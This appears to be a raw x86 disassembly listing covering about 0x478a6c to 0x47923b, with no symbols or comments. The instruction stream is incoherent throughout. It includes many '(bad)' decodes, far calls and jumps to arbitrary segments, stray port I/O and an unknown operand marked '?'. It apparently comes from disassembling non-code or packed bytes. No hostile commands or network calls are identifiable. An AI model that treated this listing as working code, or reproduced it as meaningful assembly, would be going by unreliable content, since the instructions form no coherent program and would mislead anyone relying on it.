  478a6c:	mov    eax,ds:0x714c5a74
  478a71:	test   DWORD PTR [ecx-0x79],ebp
  478a74:	xor    DWORD PTR [edx-0x16f49682],edx
  478a7a:	popa   
  478a7b:	mov    WORD PTR [ebp-0x4fb0fb41],cs
  478a81:	push   0x434a7345
  478a86:	sbb    BYTE PTR [eax],ah
  478a88:	jg     0x478afa
  478a8a:	push   DWORD PTR [eax]
  478a8c:	ror    DWORD PTR [edx-0x8],1
  478a8f:	imul   ebx,DWORD PTR ds:0xf2548d80,0x510f5208
  478a99:	mov    ds:0x85906443,al
  478a9e:	ret    0x715a
  478aa1:	fabs   
  478aa3:	add    ch,dh
  478aa5:	xlat   BYTE PTR ds:[ebx]
  478aa6:	mov    bl,0x6
  478aa8:	fisub  WORD PTR [esi+0x75]
  478aab:	fadd   st,st(3)
  478aad:	add    DWORD PTR [ecx-0x26],0x35f17cff
  478ab4:	lods   eax,DWORD PTR ds:[esi]
  478ab5:	or     dh,BYTE PTR [edx+0x71b791f3]
  478abb:	push   0x6d
  478abd:	pop    ebx
  478abe:	sar    DWORD PTR [ebx+0x8714c2f],0xaa
  478ac5:	inc    ebp
  478ac6:	mov    DWORD PTR [eax+edi*4-0x7f],edi
  478aca:	sub    DWORD PTR [ecx+ecx*2+0x4a],esi
  478ace:	pop    edx
  478ad0:	das    
  478ad1:	lock sub al,0x18
  478ad4:	jne    0x478b42
  478ad6:	add    eax,DWORD PTR [ebp-0xc]
  478ad9:	rcl    DWORD PTR [ecx+0x2a542256],1
  478adf:	fidiv  WORD PTR [ebx]
  478ae1:	retf   0xa353
  478ae4:	push   0x22aa087c
  478ae9:	dec    esi
  478aea:	ror    BYTE PTR [eax+0x60],1
  478aed:	nop
  478aee:	(bad)  
  478aef:	jg     0x478b2f
  478af1:	jl     0x478b1c
  478af3:	cmp    eax,0x2211b39d
  478af8:	not    DWORD PTR [eax+0x4c8bdb60]
  478afe:	jne    0x478b05
  478b00:	mov    DWORD PTR [ebp+0x52],esi
  478b03:	or     BYTE PTR [ebx],bh
  478b05:	or     BYTE PTR [eax-0x3781248f],dh
  478b0b:	lock inc ebx
  478b0d:	dec    esi
  478b0e:	inc    esi
  478b0f:	jge    0x478ac8
  478b11:	sbb    bh,al
  478b13:	jle    0x478b26
  478b15:	out    0xc4,al
  478b17:	cdq    
  478b18:	gs jecxz 0x478af5
  478b1b:	pop    ebx
  478b1c:	dec    esp
  478b1d:	loopne 0x478b47
  478b1f:	pusha  
  478b20:	and    cl,dl
  478b22:	push   cs
  478b23:	loop   0x478b19
  478b25:	jl     0x478aac
  478b27:	inc    ebx
  478b28:	inc    edi
  478b29:	fdiv   DWORD PTR ds:0x3844ff2
  478b2f:	lea    eax,[ebx+0x10]
  478b32:	sbb    BYTE PTR [edi+0x2c],al
  478b35:	and    eax,0x1ce714f0
  478b3a:	je     0x478b4d
  478b3c:	inc    edx
  478b3d:	xor    DWORD PTR ds:0x99a6381b,0xffffff90
  478b44:	add    BYTE PTR [eax+0x4201f24],cl
  478b4a:	xchg   ebp,eax
  478b4b:	sbb    dl,0x9
  478b4e:	loope  0x478bb0
  478b50:	mov    DWORD PTR [edi-0x73],esp
  478b53:	rol    edi,1
  478b55:	pushf  
  478b56:	call   0xd90c:0xcc5c0b63
  478b5d:	adc    al,0xf8
  478b5f:	fnstenv [edi*1+0x3f674312]
  478b66:	mov    edx,0x9190b8cc
  478b6b:	xchg   esp,eax
  478b6c:	outs   dx,BYTE PTR ds:[esi]
  478b6d:	rcl    BYTE PTR [ecx],0x85
  478b70:	pop    edi
  478b71:	xchg   ebp,eax
  478b72:	sub    BYTE PTR [eax+0x1c227e01],al
  478b78:	rol    BYTE PTR [eax+0x497c5643],1
  478b7e:	pop    esi
  478b7f:	inc    ebp
  478b80:	or     al,0x2
  478b82:	sbb    al,0x7b
  478b84:	mov    ecx,DWORD PTR [esp+eax*4+0x5]
  478b88:	sbb    ch,BYTE PTR [esi+0x287b061e]
  478b8e:	add    DWORD PTR [ebx],eax
  478b90:	add    al,0x22
  478b92:	pop    DWORD PTR [ebx+edx*8]
  478b95:	das    
  478b96:	push   edx
  478b97:	sub    esi,esp
  478b99:	cmp    eax,0x5af62e18
  478b9e:	sub    bl,ch
  478ba0:	mov    DWORD PTR [ebp+esi*1-0x50],edx
  478ba4:	jbe    0x478b2b
  478ba6:	xchg   edi,eax
  478ba7:	add    bl,BYTE PTR [eax]
  478ba9:	iret   
  478baa:	inc    ebx
  478bab:	fnstsw WORD PTR [esi+0x17849c49]
  478bb1:	ins    DWORD PTR es:[edi],dx
  478bb2:	ret    
  478bb3:	fwait
  478bb4:	jl     0x478ba5
  478bb6:	xchg   ebp,eax
  478bb7:	jno    0x478bcd
  478bb9:	jb     0x478bc7
  478bbb:	sub    DWORD PTR [edx],eax
  478bbd:	fwait
  478bbe:	pop    ebx
  478bbf:	jbe    0x478baf
  478bc1:	jne    0x478bc2
  478bc3:	fs pop es
  478bc5:	sub    BYTE PTR [edi],0xbd
  478bc8:	adc    dh,BYTE PTR [esi+0x108a68c5]
  478bce:	inc    edi
  478bcf:	(bad)  
  478bd0:	push   ss
  478bd1:	test   ecx,edx
  478bd3:	xor    BYTE PTR [edi+0x7d83bcef],bl
  478bd9:	fidivr WORD PTR [edi+0x28]
  478bdc:	cld    
  478bdd:	sub    cl,BYTE PTR [ebx]
  478bdf:	cmp    DWORD PTR [ebp+0x1e],0xeb177280
  478be6:	add    bh,BYTE PTR [ebx+edx*1+0x24]
  478bea:	add    ah,bh
  478bec:	test   BYTE PTR [eax+0x1b769a5a],0x24
  478bf3:	jle    0x478c0c
  478bf5:	mov    ecx,DWORD PTR ds:0x92c5730c
  478bfb:	mov    ebp,0x761cbd44
  478c00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  478c01:	sbb    BYTE PTR [ebx-0x29],bl
  478c04:	sub    eax,0xa704e3c1
  478c0a:	js     0x478bd9
  478c0c:	les    ecx,FWORD PTR [esi]
  478c0e:	jg     0x478bdb
  478c10:	mov    eax,DWORD PTR [eax]
  478c12:	inc    edi
  478c13:	fiadd  DWORD PTR [edx+0x48aecf99]
  478c19:	mov    esp,0x70319418
  478c1e:	sbb    ch,bl
  478c20:	in     eax,0x88
  478c22:	sbb    WORD PTR [ebx-0x3f190369],bp
  478c29:	mov    gs,WORD PTR [ecx]
  478c2b:	int    0xd5
  478c2d:	loopne 0x478bea
  478c2f:	mov    al,ds:0x1a309762
  478c34:	scas   al,BYTE PTR es:[edi]
  478c35:	inc    esi
  478c36:	daa    
  478c37:	jmp    0x478c4c
  478c39:	shr    BYTE PTR [ebp+0x28],1
  478c3c:	or     DWORD PTR [ecx-0x4979c44],edx
  478c42:	dec    eax
  478c43:	jno    0x478c4f
  478c45:	sbb    bh,BYTE PTR [ebx]
  478c47:	add    eax,0x4cfe36f6
  478c4c:	fdiv   QWORD PTR [ebp-0x18]
  478c4f:	sbb    al,0xb9
  478c51:	dec    edi
  478c52:	cmp    BYTE PTR [ecx+0x52],bl
  478c55:	sbb    edi,ecx
  478c57:	aam    0xa0
  478c59:	xor    BYTE PTR [ebp-0x34],dh
  478c5c:	clc    
  478c5d:	sbb    eax,0xa7a2663
  478c62:	xor    ebp,DWORD PTR [eax]
  478c64:	cdq    
  478c65:	push   edx
  478c66:	push   eax
  478c67:	mov    dl,BYTE PTR [ebp-0x1a]
  478c6a:	add    esi,DWORD PTR [ebp+0x3fcfdd80]
  478c70:	clc    
  478c71:	push   edx
  478c72:	stos   BYTE PTR es:[edi],al
  478c73:	xchg   BYTE PTR [ebx+edi*8],bl
  478c76:	push   ebp
  478c77:	cmp    bl,BYTE PTR [ebx+eiz*4-0x23401a7]
  478c7e:	adc    al,0x99
  478c80:	push   cs
  478c81:	or     ecx,DWORD PTR [eax+eax*4-0x21a475b2]
  478c88:	or     DWORD PTR [edx],0x9cf30d07
  478c8e:	in     al,0xdc
  478c90:	pop    eax
  478c91:	push   0x1f725dd6
  478c96:	add    ecx,edi
  478c98:	fs push esp
  478c9a:	mov    dl,0xfc
  478c9c:	mov    bh,0x84
  478c9e:	sbb    bl,BYTE PTR [eax+esi*4-0x51]
  478ca2:	and    eax,0xa5106f1f
  478ca7:	xchg   esp,eax
  478ca8:	pop    esp
  478ca9:	mov    ?,WORD PTR [eax-0x1f09238f]
  478caf:	jo     0x478d0b
  478cb1:	mov    bh,0x4a
  478cb3:	rcr    BYTE PTR [ebp+0x16360a1d],0x3c
  478cba:	call   0x6c4e:0xcdcd1708
  478cc1:	and    DWORD PTR [esi+0x124993a0],0x60
  478cc8:	or     BYTE PTR [esi+ecx*4],cl
  478ccb:	jg     0x478cd1
  478ccd:	mov    ecx,DWORD PTR [edi]
  478ccf:	icebp  
  478cd0:	or     al,0xc
  478cd2:	sti    
  478cd3:	add    al,dh
  478cd5:	add    BYTE PTR [eax],al
  478cd7:	jbe    0x478c59
  478cd9:	aaa    
  478cda:	xor    BYTE PTR [esi+0x1842090d],bl
  478ce0:	jmp    0x478c72
  478ce2:	and    cl,BYTE PTR [ebx-0x1a]
  478ce5:	aas    
  478ce6:	push   ss
  478ce7:	mov    ebp,esp
  478ce9:	sbb    esp,esp
  478ceb:	adc    edx,edx
  478ced:	enter  0x3d61,0x34
  478cf1:	cdq    
  478cf2:	cmp    ebx,DWORD PTR [esi+0x28524b73]
  478cf8:	add    cl,BYTE PTR [edx+ebp*1]
  478cfb:	jbe    0x478cc2
  478cfd:	or     bl,BYTE PTR [eax+0x71]
  478d00:	jge    0x478d07
  478d02:	mov    edi,DWORD PTR [edx]
  478d04:	jmp    0x478d09
  478d06:	loopne 0x478d70
  478d08:	cld    
  478d09:	jp     0x478cca
  478d0b:	das    
  478d0c:	enter  0xf9cb,0x50
  478d10:	js     0x478d27
  478d12:	arpl   WORD PTR [eax-0xe],dx
  478d15:	rcr    dl,0x3
  478d18:	test   al,0x99
  478d1a:	sub    DWORD PTR [edx+0x19],ebx
  478d1d:	push   0x51
  478d1f:	mov    ebp,0xe270dd4b
  478d24:	mov    bh,0xad
  478d26:	iret   
  478d27:	mov    edx,0x835d6447
  478d2c:	mov    ch,cl
  478d2e:	in     eax,dx
  478d2f:	(bad)
  478d34:	mov    edi,0x9692e147
  478d39:	loop   0x478ce2
  478d3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  478d3c:	ret    
  478d3d:	lds    eax,FWORD PTR [esi+0x700e0fc2]
  478d43:	sub    BYTE PTR [ebx+0x58],bh
  478d46:	ins    BYTE PTR es:[edi],dx
  478d47:	sub    cl,BYTE PTR [ecx+eiz*1+0x306c88bf]
  478d4e:	bound  eax,QWORD PTR [edi]
  478d50:	mov    ebp,0x787d7d62
  478d55:	fadd   st(7),st
  478d57:	aaa    
  478d58:	bound  ecx,QWORD PTR [eax]
  478d5a:	and    al,0x16
  478d5c:	mov    cl,0x96
  478d5e:	clc    
  478d5f:	(bad)  
  478d60:	scas   eax,DWORD PTR es:[edi]
  478d61:	xor    al,BYTE PTR [esi]
  478d63:	adc    al,0xe1
  478d65:	mov    bl,0x89
  478d67:	ja     0x478d8a
  478d69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  478d6a:	test   al,0x8c
  478d6c:	add    al,0x45
  478d6e:	data16 fst QWORD PTR [esi]
  478d71:	(bad)  
  478d72:	jae    0x478dea
  478d74:	mov    eax,0xdc028c83
  478d79:	pop    ds
  478d7a:	cmp    ch,BYTE PTR [eax+0x4]
  478d7d:	sbb    esp,esp
  478d7f:	pop    edi
  478d80:	cmp    dh,cl
  478d82:	aam    0xc0
  478d84:	jo     0x478dc3
  478d86:	ja     0x478d98
  478d88:	cdq    
  478d89:	loop   0x478d99
  478d8b:	enter  0x9511,0x66
  478d8f:	out    dx,al
  478d90:	shr    BYTE PTR [edx+0x35],0x32
  478d94:	sbb    al,0xb0
  478d96:	inc    esp
  478d97:	in     eax,dx
  478d98:	jmp    0x27abd067
  478d9d:	jg     0x478df8
  478d9f:	jl     0x478d2f
  478da1:	daa    
  478da2:	dec    edx
  478da3:	mov    eax,ds:0xd4bf085a
  478da8:	xor    al,0x9
  478daa:	cmp    ebp,DWORD PTR [ecx-0x61]
  478dad:	test   eax,eax
  478daf:	push   0x49
  478db1:	arpl   dx,cx
  478db3:	push   0x84e12621
  478db8:	mov    ecx,0x695b4453
  478dbd:	and    BYTE PTR [ecx-0x232910f7],dh
  478dc3:	fadd   QWORD PTR [esi-0x2d]
  478dc6:	push   cs
  478dc7:	fadd   QWORD PTR [eax+ebp*8]
  478dca:	in     al,0x3f
  478dcc:	and    BYTE PTR [edx+0xef10ca1],dh
  478dd2:	dec    edi
  478dd3:	cmp    DWORD PTR [eax+eiz*1+0x1e],0x71
  478dd8:	and    DWORD PTR fs:[eax+0x2e0c2a75],0xc64a69ac
  478de3:	push   edx
  478de5:	enter  0x534e,0x3f
  478de9:	add    esi,ecx
  478deb:	push   edx
  478dec:	cmp    al,0x83
  478dee:	jnp    0x478df4
  478df0:	or     dl,cl
  478df2:	sbb    esp,DWORD PTR [ecx]
  478df4:	cwde   
  478df5:	lods   eax,DWORD PTR ds:[esi]
  478df6:	das    
  478df7:	js     0x478e3d
  478df9:	or     al,0x3b
  478dfb:	or     edx,DWORD PTR [edx]
  478dfd:	sbb    ebx,DWORD PTR [eax+ebp*2]
  478e00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  478e01:	or     bl,dh
  478e03:	adc    DWORD PTR [edi+0x476334a3],edx
  478e09:	call   0x1ec:0xdc0beba6
  478e10:	nop
  478e11:	js     0x478e2c
  478e13:	cmp    ecx,DWORD PTR [eax]
  478e15:	cmp    BYTE PTR [eax],ah
  478e17:	jmp    0x478e7c
  478e19:	retf   0xed1
  478e1c:	imul   ebp,DWORD PTR [edi],0x487d34e4
  478e22:	enter  0xe0e0,0x2f
  478e26:	in     al,0x64
  478e28:	inc    edx
  478e29:	(bad)  
  478e2b:	mov    esp,0x40c0c96f
  478e30:	cs aam 0xd0
  478e33:	dec    eax
  478e34:	call   0xdc41:0x64780587
  478e3b:	jns    0x478e6d
  478e3d:	push   esi
  478e3e:	add    al,0xc9
  478e40:	xchg   BYTE PTR [eax],cl
  478e42:	push   es
  478e43:	mov    ds:0x52a210a,eax
  478e48:	mov    cs,WORD PTR [edi]
  478e4a:	test   BYTE PTR [edx],al
  478e4c:	leave  
  478e4d:	ja     0x478e97
  478e4f:	dec    esp
  478e50:	dec    eax
  478e51:	mov    DWORD PTR [ebp+0x63],ecx
  478e54:	or     edx,edi
  478e56:	push   edi
  478e57:	jnp    0x478e65
  478e59:	inc    esp
  478e5a:	aaa    
  478e5b:	test   al,0xb5
  478e5d:	push   esi
  478e5e:	or     al,0x20
  478e60:	adc    dl,BYTE PTR [esi]
  478e62:	loopne 0x478e69
  478e64:	sub    BYTE PTR [ebx],0xf7
  478e67:	test   esi,esi
  478e69:	fs cmp ecx,esi
  478e6c:	add    BYTE PTR [eax-0xecb9706],ch
  478e72:	or     al,BYTE PTR [ebx]
  478e74:	ror    dh,1
  478e76:	pop    es
  478e77:	les    eax,FWORD PTR [ebx]
  478e79:	cli    
  478e7a:	jg     0x478eef
  478e7c:	or     al,0x3e
  478e7e:	jns    0x478eef
  478e80:	dec    DWORD PTR [esi]
  478e82:	pop    eax
  478e83:	in     al,0x1
  478e85:	jb     0x478e90
  478e87:	je     0x478e95
  478e89:	dec    cx
  478e8c:	or     bl,ch
  478e8e:	adc    BYTE PTR [ecx+0x7f719550],cl
  478e94:	or     eax,DWORD PTR ss:[ecx]
  478e97:	push   es
  478e98:	add    edx,DWORD PTR [eax+0x8]
  478e9b:	sbb    BYTE PTR [esi+edi*8],bl
  478e9e:	adc    dh,dl
  478ea0:	and    bh,ch
  478ea2:	pop    ss
  478ea3:	push   ebp
  478ea4:	pop    esp
  478ea5:	push   ds
  478ea6:	add    esi,DWORD PTR [ecx]
  478ea8:	inc    edx
  478ea9:	pop    ss
  478eaa:	push   ebp
  478eab:	lods   al,BYTE PTR ds:[esi]
  478eac:	ret    0x8675
  478eaf:	add    dh,BYTE PTR [edi+0x9]
  478eb2:	or     al,0x2e
  478eb4:	faddp  st(4),st
  478eb6:	call   0xb138e675
  478ebb:	fild   DWORD PTR [ecx-0x3dda7a30]
  478ec1:	ficom  WORD PTR [esi+0x4]
  478ec4:	inc    esi
  478ec5:	popaw  
  478ec7:	pop    esp
  478ec8:	cmp    DWORD PTR [edi-0x6a],ebx
  478ecb:	mov    cl,0x1a
  478ecd:	mov    eax,0xd8ebd81c
  478ed2:	dec    ecx
  478ed3:	clc    
  478ed4:	std    
  478ed5:	cmp    BYTE PTR [ebx+0x8],cl
  478ed8:	mov    edi,0x10b1cc54
  478edd:	pop    edx
  478ede:	in     al,dx
  478edf:	cmc    
  478ee0:	xor    ah,bl
  478ee2:	iret   
  478ee3:	repnz add esp,DWORD PTR [esi+0x3beb26fd]
  478eea:	test   DWORD PTR [ebx+edi*1-0x9],esp
  478eee:	jge    0x478efd
  478ef0:	mov    sp,0xd940
  478ef4:	add    cl,BYTE PTR [edi+0x1b]
  478ef7:	xor    ah,BYTE PTR [edi+0x6f81d9a3]
  478efd:	iret   
  478efe:	xchg   esi,eax
  478eff:	jle    0x478f16
  478f01:	inc    esi
  478f02:	and    ecx,DWORD PTR [eax+0xc940c4d]
  478f08:	add    eax,0x1c0da6ff
  478f0d:	mov    dh,BYTE PTR [eax+0x25]
  478f10:	add    al,ah
  478f12:	mov    BYTE PTR [ebx],al
  478f14:	cli    
  478f15:	clc    
  478f16:	sar    BYTE PTR [ebx-0x59ec2d10],0x3b
  478f1d:	shl    BYTE PTR [edi+ebx*2-0x36],1
  478f21:	divps  xmm1,XMMWORD PTR [ecx+0x5dabc8f8]
  478f28:	test   BYTE PTR [edi],ch
  478f2a:	dec    ebx
  478f2b:	push   eax
  478f2c:	pusha  
  478f2d:	imul   esp,DWORD PTR [esp+ebx*4],0x14
  478f31:	inc    eax
  478f32:	mov    eax,ds:0x747368b0
  478f37:	pop    edi
  478f38:	or     ebx,DWORD PTR [ebp+0x162f585d]
  478f3e:	inc    eax
  478f3f:	and    eax,0x373e9405
  478f44:	or     DWORD PTR [ebx+0x63],edi
  478f47:	push   0x50983947
  478f4c:	adc    DWORD PTR [esi+0x2c],0x57170821
  478f53:	and    BYTE PTR [eax-0x59],cl
  478f56:	push   ebp
  478f57:	push   esp
  478f58:	jmp    0xcde:0x95c5c4a
  478f5f:	cld    
  478f60:	cmp    dh,bh
  478f62:	mov    edi,0x245c451
  478f67:	clc    
  478f68:	add    edi,esi
  478f6a:	je     0x478f98
  478f6c:	cmp    edi,DWORD PTR [ebx+0x8]
  478f6f:	jle    0x478f82
  478f71:	test   DWORD PTR [eax+0x10086859],esp
  478f77:	xchg   esp,eax
  478f78:	xlat   BYTE PTR ds:[ebx]
  478f79:	shl    DWORD PTR [edx+0x2482555a],0x96
  478f80:	add    esi,DWORD PTR [edx+0x5696cec5]
  478f86:	mov    dh,0xb5
  478f88:	and    al,BYTE PTR [eax+ecx*1-0x77]
  478f8c:	add    ch,BYTE PTR [eax+eax*1]
  478f8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  478f90:	pop    ebp
  478f91:	test   eax,0x77484254
  478f96:	push   0x38
  478f98:	and    al,al
  478f9a:	xchg   esp,eax
  478f9c:	repz push edi
  478f9e:	mov    al,0x85
  478fa0:	fcom   QWORD PTR [esi+0x1a]
  478fa3:	nop
  478fa4:	(bad)  
  478fa5:	mov    al,ds:0x9d5b2085
  478faa:	xor    dh,BYTE PTR [ebx+0x3c8767a7]
  478fb0:	sbb    esi,esi
  478fb2:	and    ebp,DWORD PTR [esp+edx*2]
  478fb5:	push   es
  478fb6:	js     0x478fad
  478fb8:	add    BYTE PTR [ecx],bl
  478fba:	nop
  478fbb:	jno    0x478f4d
  478fbd:	scas   al,BYTE PTR es:[edi]
  478fbe:	sub    ah,BYTE PTR [bx+di]
  478fc1:	or     eax,0x219fa588
  478fc6:	mov    cl,0x92
  478fc8:	(bad)  
  478fc9:	repz mov ds:0xc49e5b46,al
  478fcf:	push   esi
  478fd0:	stc    
  478fd1:	loopne 0x478fcf
  478fd3:	or     al,BYTE PTR [ebx]
  478fd5:	push   edx
  478fd6:	push   0x594057d7
  478fdb:	xchg   ebp,eax
  478fdc:	push   esp
  478fdd:	jle    0x479045
  478fdf:	and    BYTE PTR [ebx],dh
  478fe1:	push   ebp
  478fe2:	loopne 0x478ff8
  478fe4:	pusha  
  478fe5:	pop    es
  478fe6:	mov    eax,0x503856f1
  478feb:	push   ds
  478fec:	xor    BYTE PTR es:[edx],al
  478fef:	clc    
  478ff0:	js     0x479012
  478ff2:	sbb    al,0x59
  478ff4:	xchg   edi,eax
  478ff5:	add    esp,eax
  478ff7:	inc    ecx
  478ff8:	mov    ch,0xb3
  478ffa:	pop    es
  478ffb:	adc    al,0x41
  478ffd:	mov    cl,0x70
  478fff:	mov    dl,0xae
  479001:	pop    ebp
  479002:	push   esp
  479003:	mov    eax,0xab140337
  479008:	loop   0x478faa
  47900a:	jno    0x478fc3
  47900c:	pop    es
  47900d:	fiadd  DWORD PTR [edx+0x1b181b1b]
  479013:	mov    DWORD PTR [edi-0x40],ecx
  479016:	and    al,dl
  479018:	mov    al,0x7d
  47901a:	jg     0x479063
  47901c:	sbb    BYTE PTR [edi+0xc],dh
  47901f:	jmp    0x954e34aa
  479024:	sub    al,0x7
  479026:	pop    ecx
  479027:	loopne 0x478fad
  479029:	push   es
  47902a:	or     BYTE PTR [eax+0xc],ah
  47902d:	adc    eax,0x44aaf187
  479032:	adc    esp,DWORD PTR [esi+0x18]
  479035:	ret    
  479036:	xor    BYTE PTR [ecx+0x5f],ch
  479039:	js     0x478fc1
  47903b:	lods   eax,DWORD PTR ds:[esi]
  47903c:	sbb    eax,0x4e271734
  479041:	sbb    BYTE PTR [ecx],ah
  479043:	popf   
  479044:	add    bl,0x5f
  479047:	jo     0x4790b3
  479049:	mov    ecx,0xdfdd0dcd
  47904e:	add    cl,BYTE PTR [ebx+0x10]
  479051:	unpcklps xmm3,XMMWORD PTR [ebx]
  479054:	inc    eax
  479055:	cli    
  479056:	dec    DWORD PTR [edx]
  479058:	push   esp
  479059:	push   eax
  47905a:	jb     0x4790cb
  47905c:	jo     0x4790a4
  47905e:	imul   edi,DWORD PTR [eax+0x75],0xf2d7fe70
  479065:	leave  
  479066:	rcl    BYTE PTR [esi-0x11],0xac
  47906a:	in     al,0x68
  47906c:	inc    ecx
  47906d:	sbb    BYTE PTR [edx-0x36],bh
  479070:	push   ecx
  479071:	cmp    BYTE PTR [ebx+0x3be1100d],0x86
  479078:	ret    
  479079:	nop
  47907a:	outs   dx,DWORD PTR ds:[esi]
  47907b:	mov    DWORD PTR [edx],ecx
  47907d:	add    ch,BYTE PTR [ebx]
  47907f:	inc    esp
  479080:	inc    eax
  479081:	inc    ebp
  479082:	adc    al,0x54
  479084:	ror    BYTE PTR [ebx-0x48],1
  479087:	imul   ecx,DWORD PTR [edx],0x468d0c10
  47908d:	mov    al,ds:0x734d2c22
  479092:	stos   DWORD PTR es:[edi],eax
  479093:	adc    al,0x14
  479095:	or     BYTE PTR [ecx+0x2989832b],bl
  47909b:	adc    BYTE PTR [edi],dl
  47909d:	cs mov bl,0xf0
  4790a0:	fnstenv gs:[eax+0x48]
  4790a4:	sub    eax,0xe35e6c65
  4790a9:	add    al,0x89
  4790ab:	push   ss
  4790ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4790ad:	push   ss
  4790ae:	rcl    dl,1
  4790b0:	neg    bh
  4790b2:	mov    dl,BYTE PTR [edx]
  4790b4:	in     al,0x5
  4790b6:	sub    dl,0x2e
  4790b9:	jne    0x4790ac
  4790bb:	sbb    BYTE PTR [eax+0x275ae3a],al
  4790c1:	std    
  4790c2:	loop   0x4790d2
  4790c4:	sub    ecx,DWORD PTR [esp]
  4790c7:	mov    cl,BYTE PTR [eax-0x77]
  4790ca:	mov    ebp,0x1feb4098
  4790cf:	inc    ecx
  4790d0:	and    BYTE PTR [ebx+eiz*1],dl
  4790d3:	cmp    DWORD PTR [ebx+ebx*2],eax
  4790d6:	pop    ds
  4790d7:	mov    ecx,0xca2e3968
  4790dc:	sahf   
  4790dd:	add    BYTE PTR [ecx],0x6
  4790e0:	sbb    BYTE PTR [edx+0x299a1e7e],cl
  4790e6:	or     eax,ebx
  4790e8:	mov    bh,0xf7
  4790ea:	push   0x41
  4790ec:	add    cl,BYTE PTR [ebx]
  4790ee:	inc    eax
  4790ef:	inc    esp
  4790f0:	lds    edi,FWORD PTR [eax]
  4790f2:	pop    edx
  4790f3:	pop    edx
  4790f4:	xor    eax,0x24fc2e50
  4790f9:	stos   DWORD PTR es:[edi],eax
  4790fa:	mov    al,0x3f
  4790fc:	add    esp,DWORD PTR [ecx+0x375005c0]
  479102:	inc    esi
  479103:	fadd   DWORD PTR [ecx]
  479105:	jp     0x4790ab
  479107:	(bad)  
  479108:	pop    edx
  479109:	lds    eax,FWORD PTR [esp+edi*4+0x2b]
  47910d:	pop    ebx
  47910e:	inc    edx
  47910f:	scas   eax,DWORD PTR es:[edi]
  479110:	shr    DWORD PTR [esi],cl
  479112:	push   es
  479113:	and    DWORD PTR ds:0x10e4f2f0,eax
  479119:	add    bh,cl
  47911b:	(bad)  
  47911c:	push   0x4a
  47911e:	lods   al,BYTE PTR ds:[esi]
  47911f:	dec    esp
  479120:	in     al,dx
  479121:	adc    BYTE PTR [esi+0x67],dl
  479124:	and    ecx,eax
  479126:	push   edi
  479127:	(bad)  
  479128:	jmp    0x6c0724a2
  47912d:	ins    DWORD PTR es:[edi],dx
  47912e:	pop    ebp
  47912f:	add    DWORD PTR [ebx],ebp
  479131:	pop    ebx
  479132:	and    BYTE PTR [ecx-0x77],bh
  479135:	push   ds
  479136:	sbb    al,0xcb
  479138:	pop    eax
  479139:	mov    ebp,0xf0c1a4a2
  47913e:	loopne 0x4791af
  479140:	add    BYTE PTR [ebx+0x2cd30406],bl
  479146:	add    dh,BYTE PTR [ebx-0x10]
  479149:	in     al,dx
  47914a:	dec    ebp
  47914b:	clc    
  47914c:	rcr    DWORD PTR [eax],cl
  47914e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47914f:	add    DWORD PTR [edi-0x76bc3808],edx
  479155:	mov    ebx,0x9491fab2
  47915a:	adc    edi,DWORD PTR [edx+0x58409cd8]
  479160:	(bad)  
  479161:	sti    
  479162:	xlat   BYTE PTR es:[ebx]
  479164:	add    cl,BYTE PTR [ebx+0x1927a2df]
  47916a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47916b:	cmp    eax,0x9b96ccc3
  479170:	adc    BYTE PTR ds:0x7e00213e,ch
  479176:	ja     0x479173
  479178:	adc    eax,0x898e7500
  47917d:	jge    0x47917b
  47917f:	mov    cl,0x84
  479181:	fistp  DWORD PTR [eax]
  479183:	leave  
  479184:	(bad)  
  479185:	imul   esi,edi,0xffffff8a
  479188:	push   edx
  479189:	sbb    BYTE PTR [edi+ebx*1],al
  47918c:	shl    BYTE PTR es:[ebx],1
  47918f:	into   
  479190:	ror    DWORD PTR [esi],1
  479192:	pop    es
  479193:	xor    eax,0x6ef90fd3
  479198:	xor    ch,BYTE PTR [ebp+0x7cf8211e]
  47919e:	or     eax,0x6bc69ed4
  4791a3:	inc    ebx
  4791a4:	xor    BYTE PTR [esi+eiz*1],bl
  4791a7:	outs   dx,DWORD PTR ds:[esi]
  4791a8:	test   DWORD PTR [eax],edx
  4791aa:	inc    ecx
  4791ab:	mov    DWORD PTR [eax+eiz*1],ebp
  4791ae:	dec    edx
  4791af:	push   edx
  4791b0:	bound  ecx,QWORD PTR fs:[edi+0x5b92fcc4]
  4791b7:	mov    DWORD PTR [ebp+0x58],edi
  4791ba:	xchg   DWORD PTR [eax-0x6358079c],edx
  4791c0:	mov    BYTE PTR [ebx+0x6dfd41c1],0x13
  4791c7:	ror    BYTE PTR ds:0x56431a3,cl
  4791cd:	clc    
  4791ce:	xor    ebx,esi
  4791d0:	(bad)  
  4791d1:	or     eax,0x7f831eb6
  4791d6:	xor    cl,BYTE PTR [esi-0x748b79df]
  4791dc:	adc    eax,0x4d0e7912
  4791e1:	mov    edi,0x86c4be43
  4791e6:	cmp    DWORD PTR [edi+0x628c886d],eax
  4791ec:	adc    eax,ebp
  4791ee:	outs   dx,DWORD PTR ds:[esi]
  4791ef:	add    ebx,0xffffffca
  4791f2:	call   0xa15820b7
  4791f7:	adc    eax,0x9f5a118e
  4791fc:	hlt    
  4791fd:	mov    dl,BYTE PTR [ecx-0x5e]
  479200:	sbb    ebp,esi
  479202:	dec    ebx
  479203:	jl     0x47918b
  479205:	cmp    DWORD PTR [ecx],ebp
  479207:	xchg   BYTE PTR [ebx-0x5e],dl
  47920a:	jne    0x47927b
  47920c:	sub    eax,0xa05b2806
  479211:	(bad)  [ebx-0x2847cf63]
  479217:	adc    DWORD PTR [ebp+0x53],edx
  47921a:	pop    ebx
  47921b:	fcomp  QWORD PTR [ecx-0x5d]
  47921e:	fistp  QWORD PTR [esi]
  479220:	xor    cl,BYTE PTR [esi]
  479222:	add    ch,BYTE PTR [ebp-0x15]
  479225:	or     esi,DWORD PTR [edi]
  479227:	pop    esp
  479228:	adc    al,0x59
  47922a:	sbb    BYTE PTR [esi+eiz*2],0xfc
  47922e:	inc    esi
  47922f:	cmp    esi,DWORD PTR [edi+0x8]
  479232:	jl     0x4791c0
  479234:	jns    0x4792aa
  479236:	ins    DWORD PTR es:[edi],dx
  479237:	imul   esp,DWORD PTR [eax+0xa],0x28
  47923b:	sub    DWORD PTR [edx],0x240d7109
